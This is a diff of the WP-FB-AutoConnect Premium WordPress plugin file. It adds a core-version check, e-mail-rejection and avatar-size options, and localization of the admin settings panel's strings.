@@ -9,18 +9,47 @@
  * added to your admin panel. 
  * 
  * Disclaimer:
- * The code below is owned exclusively by Justin Klein (justin@justin-klein.com)
+ * The code below is owned exclusively by Justin Klein (www.justin-klein.com)
  * You are permitted to modify the code below for personal use.
  * You are not permitted to share, sell, or in any way distribute any of the code below.
  * You are not permitted to share, sell, or in any way distribute any work derived from the code below,
  * including new plugins that may include similar functionality.
  * You are not permitted to instruct others on how to reproduce the behavior implemented below.
  * Basically, you can use this plugin however you like *on your own site*; just don't share it with anyone else :)
- *
- * Please see the bottom of this file for a complete version history.
  *   
  */
- 
+
+
+/**********************************************************************/
+/**********************************************************************/
+/***************************SANITY CHECK*******************************/
+/**********************************************************************/
+/**********************************************************************/ 
+
+//If the user has an out-of-date core plugin, don't include the Premium addon. This defines the minimum required core vesion.
+define('JFB_PREMIUM_REQUIREDVER', '4.0.0');
+
+//Show an error message if the core plugin is out-of-date (detected in the next block below).
+add_action('admin_notices', 'jfb_check_premium_version');
+function jfb_check_premium_version()
+{
+	global $jfb_version, $jfb_flag_outofdate;
+    if( $jfb_flag_outofdate )
+	{
+		?><div class="error"><p><strong><?php _e('Warning', 'wp-fb-ac')?>:</strong> <?php echo sprintf(__('The WP-FB-AutoConnect Premium Addon you\'re using requires WP-FB-AutoConnect %s or newer (you currently have %s).  Please update your WP-FB-AutoConnect plugin.','wp-fb-ac'),JFB_PREMIUM_REQUIREDVER, $jfb_version)?></p></div><?php 
+	}
+}
+
+//If the core plugin is out-of-date, set a flag (for the above block) and stop including this script.
+global $jfb_version, $jfb_flag_outofdate;
+$jfb_flag_outofdate = false;
+if( version_compare($jfb_version, JFB_PREMIUM_REQUIREDVER) == -1 )
+{
+	$jfb_flag_outofdate = true;
+	return;
+}
+
+
 
 /**********************************************************************/
 /**********************************************************************/
@@ -28,11 +57,9 @@
 /**********************************************************************/
 /**********************************************************************/
 
-
 //Identify the premium version as being present & available
-define('JFB_PREMIUM', 2195);
-define('JFB_PREMIUM_VER', 33);
-define('JFB_PREMIUM_REQUIREDVER', '3.1.3');
+define('JFB_PREMIUM', 5898);
+define('JFB_PREMIUM_VER', 35);
 if(!defined('WPINC')) { echo "WP-FB-AutoConnect Premium<br/>Version: ".JFB_PREMIUM_VER."<br/>Number: ".JFB_PREMIUM;exit;}
 
 //Override plugin name
@@ -53,7 +80,7 @@ global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings;
 global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent;
 global $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
 global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver;
-global $opt_jfbp_invalids;
+global $opt_jfbp_invalids, $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h;
 $opt_jfbp_notifyusers = "jfb_p_notifyusers";
 $opt_jfbp_notifyusers_subject = "jfb_p_notifyusers_subject";
 $opt_jfbp_notifyusers_content = "jfb_p_notifyusers_content";
@@ -98,6 +125,9 @@ $opt_jfbp_bpstream_registercontent = "jfb_p_bpstream_registercontent";
 $opt_jfbp_latestversion = 'jfb_p_latestversion';
 $opt_jfbp_hide_updatenote_till_ver = 'jfb_p_hide_latestversion';
 $opt_jfbp_invalids = "jfbp_invalids";
+$opt_jfbp_email_rejected_msg = "jfbp_email_rejected_msg";
+$opt_jfbp_avatar_full_dimensions_w = "jfbp_avatar_full_dimensions_w";
+$opt_jfbp_avatar_full_dimensions_h = "jfbp_avatar_full_dimensions_h";
 
 //A prefix to identify POSTed fields when updating the xprofile mappings option.
 //This is not stored in the database, it's simply used to convert the separate POST vars into a single array (which IS stored as $opt_jfbp_xprofile_mappings).
@@ -118,6 +148,7 @@ function jfb_update_premium_opts()
     global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
     global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings, $jfb_xprofile_field_prefix;
 	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
+	global $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h;
 	
     update_option( $opt_jfbp_notifyusers,  isset( $_POST[$opt_jfbp_notifyusers] ) ? $_POST[$opt_jfbp_notifyusers] : 0 );
     update_option( $opt_jfbp_notifyusers_subject, stripslashes($_POST[$opt_jfbp_notifyusers_subject]) );
@@ -158,6 +189,9 @@ function jfb_update_premium_opts()
 	update_option( $opt_jfbp_bpstream_logincontent, $_POST[$opt_jfbp_bpstream_logincontent] );
 	update_option( $opt_jfbp_bpstream_register, isset( $_POST[$opt_jfbp_bpstream_register] ) ? $_POST[$opt_jfbp_bpstream_register] : 0 );
 	update_option( $opt_jfbp_bpstream_registercontent, $_POST[$opt_jfbp_bpstream_registercontent] );
+	update_option( $opt_jfbp_email_rejected_msg, $_POST[$opt_jfbp_email_rejected_msg] );
+	update_option( $opt_jfbp_avatar_full_dimensions_w, $_POST[$opt_jfbp_avatar_full_dimensions_w] );
+	update_option( $opt_jfbp_avatar_full_dimensions_h, $_POST[$opt_jfbp_avatar_full_dimensions_h] );
     
     //The only option that needs special handling is the xprofile mappings array; its elements come in as
     //separate POST vars prefixed by $jfb_xprofile_field_prefix; here, I combine them into the array that actually gets stored to the DB.
@@ -170,7 +204,7 @@ function jfb_update_premium_opts()
     }
     update_option($opt_jfbp_xprofile_mappings, $xprofile_map);
     do_action('wpfb_p_update_options');
-    ?><div class="updated"><p><strong>Premium Options saved.</strong></p></div><?php    
+    ?><div class="updated"><p><strong><?php _e("Premium Options saved", "wp-fb-ac")?></strong></p></div><?php    
 }
 
 //Called to delete our options from the admin panel
@@ -186,7 +220,8 @@ function jfb_delete_premium_opts()
     global $opt_jfbp_first_activation;
     global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings;
 	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
-	global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver;
+	global $opt_jfbp_latestversion, $opt_jfbp_hide_updatenote_till_ver, $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w;
+	global $opt_jfbp_avatar_full_dimensions_h;
     delete_option($opt_jfbp_notifyusers);
     delete_option($opt_jfbp_notifyusers_subject);
     delete_option($opt_jfbp_notifyusers_content);
@@ -230,6 +265,9 @@ function jfb_delete_premium_opts()
 	delete_option($opt_jfbp_bpstream_registercontent);
 	delete_option($opt_jfbp_latestversion);
 	delete_option($opt_jfbp_hide_updatenote_till_ver);
+	delete_option($opt_jfbp_email_rejected_msg);
+	delete_option($opt_jfbp_avatar_full_dimensions_w);
+	delete_option($opt_jfbp_avatar_full_dimensions_h);
 }
 
 
@@ -250,27 +288,34 @@ function jfb_output_premium_panel()
     global $opt_jfbp_wordbooker_integrate, $opt_jfbp_signupfrmlogin, $opt_jfbp_localize_facebook;
     global $opt_jfbp_xprofile_map, $opt_jfbp_xprofile_mappings, $jfb_xprofile_field_prefix;
 	global $opt_jfbp_bpstream_login, $opt_jfbp_bpstream_logincontent, $opt_jfbp_bpstream_register, $opt_jfbp_bpstream_registercontent;
+	global $opt_jfbp_email_rejected_msg, $opt_jfbp_avatar_full_dimensions_w, $opt_jfbp_avatar_full_dimensions_h;
     function disableatt() { echo (defined('JFB_PREMIUM')?"":"disabled='disabled'"); }
     ?>
     <!--Show the Premium version number along with a link to immediately check for updates-->
     <form name="formPremUpdateCheck" method="post" action="">
-        <h3>Premium Options <?php echo (defined('JFB_PREMIUM_VER')?"<span style='font-size:x-small;'>(<a href=\"javascript:document.formPremUpdateCheck.submit();\">Check for Updates</a>)</span>":""); ?></h3>
+        <h3><?php _e('Premium Options', 'wp-fb-ac')?> <?php echo (defined('JFB_PREMIUM_VER')?"<span style='font-size:x-small;'>(<a href=\"javascript:document.formPremUpdateCheck.submit();\">".__('Check for Updates', 'wp-fb-ac')."</a>)</span>":""); ?></h3>
         <input type="hidden" name="VersionCheckNow" value="1" />
     </form>
     
     <?php 
     if( !defined('JFB_PREMIUM') )
-        echo "<div class=\"jfb-admin_warning\"><i><b>The following options are available to Premium users only.</b><br />For information about the WP-FB-AutoConnect Premium Add-On, including purchasing instructions, please visit the plugin homepage <b><a href=\"$jfb_homepage#premium\">here</a></b></i>.</div>";
+        echo "<div class=\"jfb-admin_warning\"><i><b>".__("The following options are available to Premium users only.", "wp-fb-ac")."</b><br />".__("For information about the WP-FB-AutoConnect Premium Add-On, including purchasing instructions, please visit the plugin homepage:","wp-fb-ac") . " <b><a target='preminfo' href=\"$jfb_homepage#premium\">here</a></b></i>.</div>";
     ?>
     
     <form name="formPremOptions" method="post" action="">
     
-        <b>MultiSite Support:</b><br/>
+        <b><?php _e('MultiSite Support', 'wp-fb-ac')?>:</b><br/>
         <input disabled='disabled' type="checkbox" name="musupport" value="1" <?php echo ((defined('JFB_PREMIUM')&&function_exists('is_multisite')&&is_multisite())?"checked='checked'":"")?> >
-        Automatically enabled when a MultiSite install is detected
-        <?php jfb_output_simple_lightbox("(Click for more info)", "The free plugin is not aware of users registered on other sites in your WPMU installation, which can result in problems i.e. if someone tries to register on more than one site.  The Premium version will actively detect and handle existing users across all your sites.")?><br /><br />
+        <?php _e('Automatically enabled when a MultiSite install is detected', 'wp-fb-ac')?>
+        <?php jfb_output_simple_lightbox("", __("The free plugin is not aware of users registered on other sites in your WPMU installation, which can result in problems i.e. if someone tries to register on more than one site.  The Premium version will actively detect and handle existing users across all your sites.", "wp-fb-ac"))?><br /><br />
 
-        <b>Button Style:</b><br />
+        <b><?php _e('E-Mail Permissions', 'wp-fb-ac')?>:</b><br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_requirerealmail?>" value="1" <?php echo get_option($opt_jfbp_requirerealmail)?'checked="checked"':''?> /> <?php _e("Request and REQUIRE access to user's email address", 'wp-fb-ac')?>
+        <?php jfb_output_simple_lightbox("", __("The basic option to request user email addresses will prompt your visitors, but they can still choose not to share it (in the Facebook login prompt).  This option performs a secondary check to REQUIRE them to share; if they don't, the site won't log them in (until they click the button again, and agree to share their address).", 'wp-fb-ac'))?><br />
+        <?php add_option($opt_jfbp_email_rejected_msg, __("Sorry, this site requires an e-mail address to log you in.",'wp-fb-ac'));?>
+        <?php _e("Message to users who deny e-mail access:", 'wp-fb-ac')?> <input <?php disableatt() ?> type="text" size="55" name="<?php echo $opt_jfbp_email_rejected_msg; ?>" value="<?php echo get_option($opt_jfbp_email_rejected_msg); ?>" /><br /><br/>
+
+        <b><?php _e('Button Style', 'wp-fb-ac')?>:</b><br />
         <?php add_option($opt_jfbp_buttontext, "Login with Facebook");
         add_option($opt_jfbp_buttonsize, "2");
         $btnDefault = $jfb_data_url . "/assets/btn01.png";
@@ -281,27 +326,27 @@ function jfb_output_premium_panel()
 
         <input <?php disableatt() ?> type="radio" style="float:left;" name="<?php echo $opt_jfbp_buttonstyle; ?>" value="0" <?php echo (get_option($opt_jfbp_buttonstyle)==0?"checked='checked'":"")?>>
         <div class="jfb-greybox" style="float:left;">
-            <b>Original (xfbml):</b><br/>
-            Text: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_buttontext; ?>" value="<?php echo get_option($opt_jfbp_buttontext); ?>" /><br />
-            Style: 
-            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="2" <?php echo (get_option($opt_jfbp_buttonsize)==2?"checked='checked'":"")?>>Small
-            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="3" <?php echo (get_option($opt_jfbp_buttonsize)==3?"checked='checked'":"")?>>Medium
-            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="4" <?php echo (get_option($opt_jfbp_buttonsize)==4?"checked='checked'":"")?>>Large
-            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="5" <?php echo (get_option($opt_jfbp_buttonsize)==5?"checked='checked'":"")?>>X-Large<br />
+            <b><?php _e('Original', 'wp-fb-ac')?> (xfbml):</b><br/>
+            <?php _e('Text', 'wp-fb-ac')?>: <input <?php disableatt() ?> type="text" size="30" name="<?php echo $opt_jfbp_buttontext; ?>" value="<?php echo get_option($opt_jfbp_buttontext); ?>" /><br />
+            <?php _e('Style', 'wp-fb-ac')?>: 
+            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="2" <?php echo (get_option($opt_jfbp_buttonsize)==2?"checked='checked'":"")?>><?php _e('Small', 'wp-fb-ac')?>
+            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="3" <?php echo (get_option($opt_jfbp_buttonsize)==3?"checked='checked'":"")?>><?php _e('Medium', 'wp-fb-ac')?>
+            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="4" <?php echo (get_option($opt_jfbp_buttonsize)==4?"checked='checked'":"")?>><?php _e('Large', 'wp-fb-ac')?>
+            <input <?php disableatt() ?> type="radio" name="<?php echo $opt_jfbp_buttonsize; ?>" value="5" <?php echo (get_option($opt_jfbp_buttonsize)==5?"checked='checked'":"")?>><?php _e('X-Large', 'wp-fb-ac')?><br />
         </div><br clear="all"/>
         <input <?php disableatt() ?> type="radio" style="float:left;" name="<?php echo $opt_jfbp_buttonstyle; ?>" value="1" <?php echo (get_option($opt_jfbp_buttonstyle)==1?"checked='checked'":"")?>>
         <div class="jfb-greybox" style="float:left;">
-            <b>Image (styleable):</b><br/>
-            URL: <input <?php disableatt() ?> type="text" size="80" name="<?php echo $opt_jfbp_buttonimg; ?>" value="<?php echo get_option($opt_jfbp_buttonimg); ?>" /><br/>
-            Preview: <img style="vertical-align:middle;margin-top:5px;" src="<?php echo $btnPreview?>" alt="(Login Button)" />
+            <b><?php _e('Image (styleable)', 'wp-fb-ac')?>:</b><br/>
+            <?php _e('URL', 'wp-fb-ac')?>: <input <?php disableatt() ?> type="text" size="80" name="<?php echo $opt_jfbp_buttonimg; ?>" value="<?php echo get_option($opt_jfbp_buttonimg); ?>" /><br/>
+            <?php _e('Preview', 'wp-fb-ac')?>: <img style="vertical-align:middle;margin-top:5px;" src="<?php echo $btnPreview?>" alt="(Login Button)" />
         </div><br clear="all"/><br/>
         
-        <b>Additional Buttons:</b><br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_commentfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_commentfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button below the comment form<br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wploginfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_wploginfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the standard Login page (wp-login.php)<br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_registrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_registrationfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the Registration page (wp-login.php)<br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpregistrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_bpregistrationfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the BuddyPress Registration page (/register)<br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_signupfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_signupfrmlogin)?'checked="checked"':''?> /> Add a Facebook Login button to the Signup page (wp-signup.php) (WPMU Only)<br /><br />
+        <b><?php _e('Additional Buttons', 'wp-fb-ac')?>:</b><br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_commentfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_commentfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button below the comment form', 'wp-fb-ac')?><br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wploginfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_wploginfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the standard Login page', 'wp-fb-ac')?> (wp-login.php)<br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_registrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_registrationfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the Registration page', 'wp-fb-ac')?> (wp-login.php)<br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_bpregistrationfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_bpregistrationfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the BuddyPress Registration page', 'wp-fb-ac')?> (/register)<br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_signupfrmlogin?>" value="1" <?php echo get_option($opt_jfbp_signupfrmlogin)?'checked="checked"':''?> /> <?php _e('Add a Facebook Login button to the Signup page (WPMU Only)', 'wp-fb-ac')?> (wp-signup.php)<br /><br />
                 		
 		<!-- Facebook's OAuth 2.0 migration BROKE my ability to localize the XFBML-generated dialog.  I've reported a bug, and will do my best to fix it as soon as possible.
 		 <b>Facebook Localization:</b><br />
@@ -311,15 +356,25 @@ function jfb_output_premium_panel()
 		<dfn title="The Wordpress locale is specified in wp-config.php, where valid language codes are of the form 'en_US', 'ja_JP', 'es_LA', etc.  Please see http://codex.wordpress.org/Installing_WordPress_in_Your_Language for more information on localizing Wordpress, and http://developers.facebook.com/docs/internationalization/ for a list of locales supported by Facebook.">(Mouseover for more info)</dfn><br /><br />
 		 -->
 						
-        <b>Avatar Caching:</b><br />  
-        <?php add_option($opt_jfbp_cache_avatars_fullsize, get_option($opt_jfbp_cache_avatars)); ?>       
+        <b><?php _e('Avatars', 'wp-fb-ac')?>:</b><br />
+   		<script type="text/javascript">function isNumber(evt) {evt = (evt) ? evt : window.event;var charCode = (evt.which) ? evt.which : evt.keyCode; if (charCode > 31 && (charCode < 48 || charCode > 57)) { return false;}return true;}</script>  
+        <?php 
+        add_option($opt_jfbp_cache_avatars_fullsize, get_option($opt_jfbp_cache_avatars)); 
+		add_option($opt_jfbp_avatar_full_dimensions_w, 200);
+		add_option($opt_jfbp_avatar_full_dimensions_h, 200);        
+        ?> 
         <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_cache_avatars?>" value="1" <?php echo get_option($opt_jfbp_cache_avatars)?'checked="checked"':''?> />
-        Cache Facebook avatars locally (thumbnail) <?php jfb_output_simple_lightbox("(Click for more info)", "This will make a local copy of Facebook avatars, so they'll always load reliably, even if Facebook's servers go offline or if a user deletes their photo from Facebook. They will be fetched and updated whenever a user logs in.");?><br />
+        <?php _e('Cache Facebook avatars locally', 'wp-fb-ac')?> (<?php _e('thumbnail', 'wp-fb-ac')?>) <?php jfb_output_simple_lightbox("", __("This will make a local copy of Facebook avatars, so they'll always load reliably, even if Facebook's servers go offline or if a user deletes their photo from Facebook. They will be fetched and updated whenever a user logs in.", "wp-fb-ac"));?><br />
         <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_cache_avatars_fullsize?>" value="1" <?php echo get_option($opt_jfbp_cache_avatars_fullsize)?'checked="checked"':''?> />
-        Cache Facebook avatars locally (fullsize) <?php jfb_output_simple_lightbox("(Click for more info)", "Because most themes only utilize thumbnail-sized avatars, caching full-sized images is often unnecessary.  If you're not actually using full-sized avatars I recommend disabling this option, as doing so will speed up logins and save space on your server (there's a small per-login performance cost to copying the files locally).")?><br />
+        <?php _e('Cache Facebook avatars locally', 'wp-fb-ac')?> (<?php _e('large', 'wp-fb-ac')?>):
+		<input <?php disableatt() ?> onkeypress="return isNumber(event)" type="text" size="4" name="<?php echo $opt_jfbp_avatar_full_dimensions_w; ?>" value="<?php echo get_option($opt_jfbp_avatar_full_dimensions_w) ?>" />
+		x
+		<input <?php disableatt() ?> onkeypress="return isNumber(event)" type="text" size="4" name="<?php echo $opt_jfbp_avatar_full_dimensions_h; ?>" value="<?php echo get_option($opt_jfbp_avatar_full_dimensions_h) ?>" />
+	    <?php jfb_output_simple_lightbox("", __("The 'thumbnail' avatar is what will be shown when your theme requests avatars sized 50x50 or less (Facebook's default thumbnail size).  If your theme displays avatars larger than this, you'll want to cache larger avatars as well (but note that there's a small per-login performance cost to copying the files locally, so if you're not actually using large avatars, I recommend leaving this option disabled).", 'wp-fb-ac') . "<br/><br/>" . 
+	    								     __("Please note that the dimensions you specify should be considered a MAXIMUM; Facebook will attempt to scale the avatar as close to your requested dimensions as possible, and then crop it down to fit.  If you just want the largest possible image, you can enter very large numbers (i.e. 99999x99999).  But since the final size is not precisely guaranteed, please consider using CSS to ensure the images mesh nicely with your theme.", 'wp-fb-ac'))?><br/>
         
         <?php add_option($opt_jfbp_cache_avatar_dir, 'facebook-avatars'); ?>
-        Cache dir:
+        <?php _e('Cache dir', 'wp-fb-ac')?>:
             <?php
             //If this is multisite, we'll allow the use of the uploaddir of *any* blog in the network (not just the current one).
             //This way, all the blogs can share the same avatar cache if desired.
@@ -349,118 +404,118 @@ function jfb_output_premium_panel()
             }
             ?>
         <input <?php disableatt() ?> type="text" size="15" name="<?php echo $opt_jfbp_cache_avatar_dir; ?>" value="<?php echo get_option($opt_jfbp_cache_avatar_dir); ?>" />
-        <?php jfb_output_simple_lightbox("(Click for more info)", "Changing the cache directory will not move existing avatars or update existing users; it only applies to subsequent logins.  It's therefore recommended that you choose a cache directory once, then leave it be.")?><br /><br />
+        <?php jfb_output_simple_lightbox("", __("Changing the cache directory will not move existing avatars or update existing users; it only applies to subsequent logins.  It's therefore recommended that you choose a cache directory once, then leave it be.", 'wp-fb-ac'))?><br /><br/>
+<!--        
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wordbooker_integrate?>" value="1" <?php echo get_option($opt_jfbp_wordbooker_integrate)?'checked="checked"':''?> /> <?php _e('Use Facebook avatars for comments imported by the Wordbooker plugin', 'wp-fb-ac')?>
+        <?php jfb_output_simple_lightbox("", __("The Wordbooker plugin allows you to push blog posts to your Facebook wall, and also to import comments on these posts back to your blog.  This option will display real Facebook avatars for imported comments, provided the commentor logs into your site at least once.", 'wp-fb-ac'))?><br /><br />
+-->
 
-        <b>Manual Linking &amp; Unlinking:</b><br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_link?>" value="1" <?php echo get_option($opt_jfbp_allow_link)?'checked="checked"':''?> /> Allow users to manually link their Wordpress/Buddypress accounts to Facebook
-        <?php jfb_output_simple_lightbox("(Click for more info)", "This will add a button to each non-Facebook-connected user's Wordpress (and Buddypress) profile page, allowing them to manually link their blog account to their Facebook profile.  Although this plugin does try to match connecting Facebook users to existing Wordpress accounts by e-mail, this option provides a way for users to explicitly identify their local blog account - even if their e-mails don't match.")?><br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_disassociate?>" value="1" <?php echo get_option($opt_jfbp_allow_disassociate)?'checked="checked"':''?> /> Allow users to disassociate their Wordpress/Buddypress accounts from Facebook
-        <?php jfb_output_simple_lightbox("(Click for more info)", "This will add a button to each connected user's Wordpress (and Buddypress) profile page, allowing them to disassociate their blog account from their Facebook profile.  User accounts which are not connected to Facebook will display 'Not Connected' in place of a button.")?><br />
-        <input disabled='disabled' type="checkbox" name="admindisassociate" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> /> Allow administrators to disassociate Wordpress/Buddypress user accounts from Facebook
-        <?php jfb_output_simple_lightbox("(Click for more info)", "This option is always enabled for administrators.")?><br /><br />
+        <b><?php _e('Manual Linking & Unlinking', 'wp-fb-ac')?>:</b><br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_link?>" value="1" <?php echo get_option($opt_jfbp_allow_link)?'checked="checked"':''?> /> <?php _e('Allow users to manually link their Wordpress/Buddypress accounts to Facebook', 'wp-fb-ac')?>
+        <?php jfb_output_simple_lightbox("", __("This will add a button to each non-Facebook-connected user's Wordpress (and Buddypress) profile page, allowing them to manually link their blog account to their Facebook profile.  Although this plugin does try to match connecting Facebook users to existing Wordpress accounts by e-mail, this option provides a way for users to explicitly identify their local blog account - even if their e-mails don't match.", 'wp-fb-ac'))?><br />
+        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_allow_disassociate?>" value="1" <?php echo get_option($opt_jfbp_allow_disassociate)?'checked="checked"':''?> /> <?php _e('Allow users to disassociate their Wordpress/Buddypress accounts from Facebook', 'wp-fb-ac')?>
+        <?php jfb_output_simple_lightbox("", __("This will add a button to each connected user's Wordpress (and Buddypress) profile page, allowing them to disassociate their blog account from their Facebook profile.  User accounts which are not connected to Facebook will display 'Not Connected' in place of a button.", 'wp-fb-ac'))?><br />
+        <input disabled='disabled' type="checkbox" name="admindisassociate" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> /> <?php _e('Allow administrators to disassociate Wordpress/Buddypress user accounts from Facebook', 'wp-fb-ac')?>
+        <?php jfb_output_simple_lightbox("", __("This option is always enabled for administrators.", 'wp-fb-ac'))?><br /><br />
 
-        <b>Shortcode Support:</b><br />
+        <b><?php _e('Shortcode Support', 'wp-fb-ac')?>:</b><br />
         <input disabled='disabled' type="checkbox" name="shortcodesupport" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> />
-        Enable shortcode for rendering Facebook buttons to your posts and pages
-        <?php jfb_output_simple_lightbox("(Click for more info)", "Shortcode support will allow you to manually place Facebook login buttons in your posts or pages, simply by inserting the tag <b>[jfb_facebook_btn]</b> in their content. The Facebook button will only be shown when nobody is logged into the site; otherwise, nothing is shown.  If you'd like to specify something to output for logged-in users, you can use the 'loggedin' parameter, like <b>[jfb_facebook_btn loggedin='Welcome!']</b>.<br/><br/>With the Premium addon installed, shortcode support is always enabled.  For general information on Wordpress shortcode, please see <a href='http://codex.wordpress.org/Shortcode' target='shortcode'>here</a>.")?><br /><br />
+        <?php _e('Enable shortcode for rendering Facebook buttons to your posts and pages', 'wp-fb-ac')?>
+        <?php 
+        $lbContent = sprintf(__("Shortcode support will allow you to manually place Facebook login buttons in your posts or pages, simply by inserting the tag %s in their content. The Facebook button will only be shown when nobody is logged into the site; otherwise, nothing is shown.  If you'd like to specify something to output for logged-in users, you can use the %s parameter, like %s.", 'wp-fb-ac'), "<b>[jfb_facebook_btn]</b>", "'loggedin'", "<b>[jfb_facebook_btn loggedin='Welcome!']</b>");
+        $lbContent .= "<br/><br/>";
+        $lbContent .= sprintf(__("With the Premium addon installed, shortcode support is always enabled.  For general information on Wordpress shortcode, please see %s.", 'wp-fb-ac'), "<a href='http://codex.wordpress.org/Shortcode' target='shortcode'>http://codex.wordpress.org/Shortcode</a>"); 
+        jfb_output_simple_lightbox("", $lbContent)?><br /><br />
             
-        <b>Double Logins:</b><br />
+        <b><?php _e('Double Logins', 'wp-fb-ac')?>:</b><br />
         <input disabled='disabled' type="checkbox" name="doublelogin" value="1" <?php echo (defined('JFB_PREMIUM')?"checked='checked'":"")?> />
-        Automatically handle double logins 
-        <?php jfb_output_simple_lightbox("(Click for more info)", "If a visitor opens two browser windows, logs into one, then logs into the other, the security nonce check will fail.  This is because in the second window, the current user no longer matches the user for which the nonce was generated.  The free version of the plugin reports this to the visitor, giving them a link to their desired redirect page.  The premium version will transparently handle such double-logins: to visitors, it'll look like the page has just been refreshed and they're now logged in.  For more information on nonces, please visit http://codex.wordpress.org/WordPress_Nonces.")?><br /><br />
-
-        <b>E-Mail Permissions:</b><br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_requirerealmail?>" value="1" <?php echo get_option($opt_jfbp_requirerealmail)?'checked="checked"':''?> /> Enforce access to user's real (unproxied) email
-        <?php jfb_output_simple_lightbox("(Click for more info)", "The basic option to request user emails will prompt your visitors, but they can still hide their true addresses by using a Facebook proxy (click 'change' in the permissions dialog, and select 'xxx@proxymail.facebook.com').  This option performs a secondary check to enforce that they allow access to their REAL e-mail.  Note that the check requires several extra queries to Facebook's servers, so it could result in a slightly longer delay before the login initiates.")?><br /><br />
+        <?php _e('Automatically handle double logins', 'wp-fb-ac')?> 
+        <?php jfb_output_simple_lightbox("", sprintf(__("If a visitor opens two browser windows, logs into one, then logs into the other, the security nonce check will fail.  This is because in the second window, the current user no longer matches the user for which the nonce was generated.  The free version of the plugin reports this to the visitor, giving them a link to their desired redirect page.  The premium version will transparently handle such double-logins: to visitors, it'll look like the page has just been refreshed and they're now logged in.  For more information on nonces, please visit %s.", 'wp-fb-ac'), "<a href='http://codex.wordpress.org/WordPress_Nonces' target='nonces'>http://codex.wordpress.org/WordPress_Nonces</a>"))?><br /><br />
         
-        <b>Wordbooker Avatar Integration:</b><br />
-        <input <?php disableatt() ?> type="checkbox" name="<?php echo $opt_jfbp_wordbooker_integrate?>" value="1" <?php echo get_option($opt_jfbp_wordbooker_integrate)?'checked="checked"':''?> /> Use Facebook avatars for <a href="http://wordpress.org/extend/plugins/wordbooker/">Wordbooker</a>-imported comments
-        <?php jfb_output_simple_lightbox("(Click for more info)", "The Wordbooker plugin allows you to push blog posts to your Facebook wall, and also to import comments on these posts back to your blog.  This option will display real Facebook avatars for imported comments, provided the commentor logs into your site at least once.")?><br /><br />
-        
-		<b>Autoregistered User Role:</b><br />
